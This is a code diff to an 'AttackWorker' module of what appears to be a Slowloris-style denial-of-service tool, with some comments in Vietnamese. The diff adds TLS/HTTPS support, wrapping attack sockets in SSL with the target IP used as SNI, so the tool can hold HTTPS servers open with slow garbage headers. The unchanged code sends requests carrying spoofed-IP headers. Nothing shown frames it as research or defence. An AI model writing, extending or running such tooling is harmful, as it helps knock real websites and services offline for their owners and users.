@@ -6,6 +6,7 @@ Attack Worker - Individual thread attack logic
 """
 
 import socket
+import ssl
 import random
 import time
 import logging
@@ -14,6 +15,7 @@ from typing import Optional
 from .statistics import AttackStatistics
 from .ip_generator import IPGenerator
 from .http_methods import HTTPMethodBuilder, HTTPMethod
+from .tls_handler import TLSConfig, TLSHandler
 from ..config import USER_AGENTS, DEFAULT_TIMEOUT, DEFAULT_KEEP_ALIVE_INTERVAL
 
 class AttackWorker:
@@ -29,7 +31,8 @@ class AttackWorker:
         http_method: Optional[HTTPMethod] = None,
         randomize_method: bool = False,
         timeout: int = DEFAULT_TIMEOUT, 
-        keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL
+        keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL,
+        tls_config: Optional[TLSConfig] = None
     ):
         """
         Initialize attack worker
@@ -44,6 +47,7 @@ class AttackWorker:
             randomize_method: Use random HTTP method for each request
             timeout: Socket timeout
             keep_alive_interval: Interval between garbage headers
+            tls_config: TLS configuration for HTTPS (None = HTTP)
         """
         self.target_ip = target_ip
         self.target_port = target_port
@@ -54,7 +58,13 @@ class AttackWorker:
         self.randomize_method = randomize_method
         self.timeout = timeout
         self.keep_alive_interval = keep_alive_interval
+        self.tls_config = tls_config or TLSConfig()
         self.running = True
+        
+        # Initialize TLS handler if HTTPS enabled
+        self.tls_handler = None
+        if self.tls_config.use_https:
+            self.tls_handler = TLSHandler(self.tls_config)
         
     def stop(self):
         """Dừng worker"""
@@ -103,7 +113,7 @@ class AttackWorker:
             )
         
     def run(self):
-        """Main worker loop - Slowloris style attack với IP spoofing"""
+        """Main worker loop - Slowloris style attack với IP spoofing và HTTPS support"""
         while self.running:
             sock = None
             spoofed_ip = None
@@ -118,8 +128,20 @@ class AttackWorker:
                 sock.settimeout(self.timeout)
                 sock.connect((self.target_ip, self.target_port))
                 
+                # Wrap with SSL/TLS if HTTPS enabled
+                if self.tls_config.use_https and self.tls_handler:
+                    try:
+                        # Use target IP as SNI hostname if not specified
+                        sni_hostname = self.tls_config.sni_hostname or self.target_ip
+                        sock = self.tls_handler.wrap_socket(sock, server_hostname=sni_hostname)
+                        logging.debug(f"Worker {self.worker_id}: SSL/TLS handshake successful")
+                    except ssl.SSLError as e:
+                        self.stats.connection_failed(f"ssl_error_{type(e).__name__}")
+                        logging.debug(f"Worker {self.worker_id}: SSL handshake failed - {e}")
+                        raise
+                
                 self.stats.connection_established(spoofed_ip)
-                logging.debug(f"Worker {self.worker_id}: Connected with IP {spoofed_ip}")
+                logging.debug(f"Worker {self.worker_id}: Connected {'(HTTPS)' if self.tls_config.use_https else '(HTTP)'} with IP {spoofed_ip}")
                 
                 # Gửi HTTP request với spoofing headers
                 http_request = self.build_http_request(spoofed_ip)
@@ -135,6 +157,12 @@ class AttackWorker:
                     sock.send(garbage_header.encode('utf-8'))
                     self.stats.packet_sent()
                     
+            except ssl.SSLError as e:
+                # SSL-specific errors
+                error_type = f"ssl_{type(e).__name__}"
+                self.stats.connection_failed(error_type)
+                logging.debug(f"Worker {self.worker_id}: SSL error - {e}")
+                
             except socket.timeout:
                 self.stats.connection_failed("timeout")
                 logging.debug(f"Worker {self.worker_id}: Connection timeout")
